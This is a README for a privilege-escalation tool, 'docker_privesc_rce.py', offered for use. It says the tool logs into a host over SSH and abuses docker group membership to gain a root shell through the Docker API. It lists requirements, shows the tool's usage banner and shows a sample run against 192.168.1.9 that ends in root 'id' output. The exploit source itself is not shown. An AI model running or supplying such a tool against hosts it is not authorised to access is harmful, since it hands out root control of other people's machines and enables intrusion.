# docker_privesc_rce.py

## Summary

This exploit ssh into a machine and gives you a root shell by abuse the docker api if you are part of the docker group.
docker have the same os permissions as root so this is no bug. However this exploit is convinient if you want to
have a root shell

## Requirments

* Your user account need to be part of the 'docker' group.
* install sshpass application

## Exploit

Show usage menu

```sh
 docker_privesc_rce  master ⦿ ./docker_privesc_rce.py

▓█████▄  ▒█████   ▄████▄   ██ ▄█▀▓█████  ██▀███   ██▓███   ██▀███   ██▓ ██▒   █▓▓█████   ██████  ▄████▄   ██▀███   ▄████▄  ▓█████
▒██▀ ██▌▒██▒  ██▒▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒▓██░  ██▒▓██ ▒ ██▒▓██▒▓██░   █▒▓█   ▀ ▒██    ▒ ▒██▀ ▀█  ▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀
░██   █▌▒██░  ██▒▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒▓██░ ██▓▒▓██ ░▄█ ▒▒██▒ ▓██  █▒░▒███   ░ ▓██▄   ▒▓█    ▄ ▓██ ░▄█ ▒▒▓█    ▄ ▒███
░▓█▄   ▌▒██   ██░▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  ▒██▄█▓▒ ▒▒██▀▀█▄  ░██░  ▒██ █░░▒▓█  ▄   ▒   ██▒▒▓▓▄ ▄██▒▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄
░▒████▓ ░ ████▓▒░▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒▒██▒ ░  ░░██▓ ▒██▒░██░   ▒▀█░  ░▒████▒▒██████▒▒▒ ▓███▀ ░░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
 ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░▒▓▒░ ░  ░░ ▒▓ ░▒▓░░▓     ░ ▐░  ░░ ▒░ ░▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
 ░ ▒  ▒   ░ ▒ ▒░   ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░░▒ ░       ░▒ ░ ▒░ ▒ ░   ░ ░░   ░ ░  ░░ ░▒  ░ ░  ░  ▒     ░▒ ░ ▒░  ░  ▒    ░ ░  ░
 ░ ░  ░ ░ ░ ░ ▒  ░        ░ ░░ ░    ░     ░░   ░ ░░         ░░   ░  ▒ ░     ░░     ░   ░  ░  ░  ░          ░░   ░ ░           ░
   ░        ░ ░  ░ ░      ░  ░      ░  ░   ░                 ░      ░        ░     ░  ░      ░  ░ ░         ░     ░ ░         ░  ░
 ░               ░                                                          ░                   ░                 ░
[nighter@nighter.se]

Usage: ./docker_privesc_rce.py <USERNAME>@<HOST:[PORT]>
```

Run the exploit

```sh
⬢  docker_privesc_rce  master ⦿ ./docker_privesc_rce.py vagrant@192.168.1.9
Password:
# id
id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
#
```
